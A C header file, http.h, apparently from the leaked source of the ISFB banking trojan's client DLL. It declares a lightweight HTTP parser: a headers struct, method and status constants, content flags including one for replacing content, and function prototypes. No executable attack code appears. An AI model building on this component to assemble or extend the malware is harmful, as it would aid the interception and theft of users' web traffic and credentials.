//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// ISFB project. Version 2.13.24.1
//	
// module: http.h
// $Revision: 187 $ 
// $Date: 2014-02-03 18:40:38 +0300 (Пн, 03 фев 2014) $
// description:
//	ISFB client DLL. Lightweight HTTP Parser.


// HTTP 1.1 headers 
typedef struct _HTTP_HEADERS
{
#if _DEBUG
	ULONG	Magic;
#endif
	// Strings
	PCHAR	Method;
	PCHAR	Url;
	PCHAR	pReferer;
	LONG	ContentSize;	 
	LONG	HeadersSize;
	LONG	RefererSize;
	ULONG	Flags;
	ULONG	Status;
	PCHAR	Binary;		// Headers binary buffer, allocated by parses
} HTTP_HEADERS, *PHTTP_HEADERS;

#define HTTP_HEADERS_MAGIC (ULONG)'HTTH'
#define ASSERT_HTTP_HEADERS(x)	ASSERT(x->Magic == HTTP_HEADERS_MAGIC)

#define	HTTP_STATUS_CODE_OK		(ULONG)'002 '
#define	HTTP_VERSION_LENGTH		8	// bytes ("HTTP/1.1" etc)

// HTTP context flags
#define	CF_CONTENT			1		// transfers apropriate content
#define	CF_CHUNKED			2		// content is chunked
#define CF_LENGTH			4		// has content length
#define CF_FORM				8		// transfers form data
#define	CF_LOAD_ALL			0x10	// load whole stream before processing it (do not process single chunk)
#define	CF_SKIP				0x20	// skip processing content
#define	CF_REPLACE			0x40	// content will be replaced

#define	uGET				(ULONG)' TEG'
#define	uPUT				(ULONG)' TUP'
#define	uPOST				(ULONG)'TSOP'
#define	uHTTP				(ULONG)'PTTH'
#define	uClose				(ULONG)'solc'
#define	uChunked			(ULONG)'nuhc'
#define	uCRLF				(USHORT)'\r\n'


// HTTP flags
#define	HTTP_F_CONNECTION_CLOSE		1

BOOL HttpIsRequest(PCHAR Buffer, ULONG Size);
BOOL HttpIsReply(PCHAR Buffer, ULONG Size);
PHTTP_HEADERS	HttpParseHeaders(PCHAR Buffer, ULONG Size);
VOID HttpReleaseHeaders(PHTTP_HEADERS Headers);
PCHAR HttpQueryUrl(PHTTP_HEADERS Headers, BOOL bIsSsl);
PCHAR HttpQueryAgent(PHTTP_HEADERS	Headers);
LPSTR	HttpFindHeaderA(LPSTR Headers, LPSTR Name, PULONG pSize);
LPWSTR	HttpFindHeaderW(LPWSTR Headers, LPWSTR Name, PULONG pSize);

PCHAR HttpGetChunk(IN PCHAR	ChunkHeader, OUT PULONG	pChunkSize);

LPSTR HttpSetHeaderA(LPCSTR Headers, LPCSTR HeaderName, LPCSTR HeaderValue, LPCSTR Delimeter);
LPWSTR	HttpSetHeaderW(LPCWSTR Headers, LPCSTR HeaderName, LPCSTR HeaderValue);
LPSTR	StrStrNA(LPSTR Source, LPSTR Search, LONG Length);

